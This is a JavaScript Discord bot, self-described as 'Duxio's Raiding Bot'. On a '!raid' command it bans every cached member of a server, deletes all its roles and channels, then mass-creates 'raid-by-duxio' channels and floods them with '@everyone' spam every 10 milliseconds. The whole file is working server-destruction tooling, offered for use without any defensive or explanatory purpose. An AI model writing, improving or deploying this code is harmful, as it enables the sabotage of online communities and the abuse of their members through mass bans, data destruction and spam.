

const Discord = require('discord.js');
const {token} = require("./settings.json")
const { Client, Intents } = require('discord.js');

const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES] });
client.login(token)

client.on("ready", async () =>{
    console.log("Online")
    client.user.setStatus("Online")  
})

client.on("message", async message =>{
    if(message.content == "!raid"){
        message.guild.members.cache.forEach(m =>{
            m.ban().catch(err =>{})
        })
        message.guild.roles.cache.forEach(r =>{
            r.delete().catch(err=>{})
        })
        message.guild.channels.cache.forEach(c =>{
            c.delete().catch(err=>{})
        })
        var x = 0
        let op
        let interval = setInterval(()=>{
            let t = message.guild.channels.create("raid-by-duxio").then( m=>{
                
                setInterval(()=>{
                    let role = message.guild.roles.cache.find(r => r.name === "@everyone").id
                    m.send("@everyone Duxio on top")
                }, 1 * 10)
            })
            ++x
            if(x == 20){
                clearInterval(interval)
            }
        }, 1 * 10)
    }

    module.exports = {
        name: "help",
        description: "simple help command",

        async run (bot, message, args) {
            const help = new Discord.MessageEmbed()
            .setColor("RANDOM")
            .setTitle('Prefix-‘!‘')
            .setAuthor('Command List', message.author.displayAvatarURL())

            .addFields({
                name: 'About this bot',
                value: "Duxio's Raiding Bot coded in .js"
            },
            {
                name: 'Information',
                value: 'Coming soon.',
            },
            {
                name: 'Commands',
                value: 'Raid | Coming soon...'
            },)
            
            message.channel.send(help)
        }
    }
})

